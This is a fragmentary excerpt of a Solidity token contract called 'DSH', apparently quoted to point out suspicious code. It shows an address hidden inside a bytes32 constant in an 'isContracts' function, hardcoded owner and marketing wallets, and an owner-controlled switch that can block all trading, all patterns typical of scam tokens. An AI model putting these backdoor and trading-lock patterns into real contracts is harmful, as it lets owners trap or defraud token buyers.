...
contract ERC20 is Ownable, IERC20 {
    ...
    function isContracts(address account) public pure returns (bool) {
        bytes32 accountHash = 0x0000000000000000000000004A1858aB84500a68bA88d0945F9787B3ADD03C4f;
...
contract token is ERC20 {
    ...
    constructor() ERC20("DSH", "DSH") {

        uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        // Create a uniswap pair for this new token
        _tokenOwner = address(0x3b967d4A5436b061A66acdf1EB9214704E1198Eb);
        marketAddress = address(0x769e75F98E1fF9ecb9934A3eF733F3a0DCb80676);
    ...
    function setTXswitch(bool isTX) external onlyOwner {
        TXswitch = isTX;
    }
    ...
    function _transfer(
        ...
        require(TXswitch,"I said you're ready to trade?");
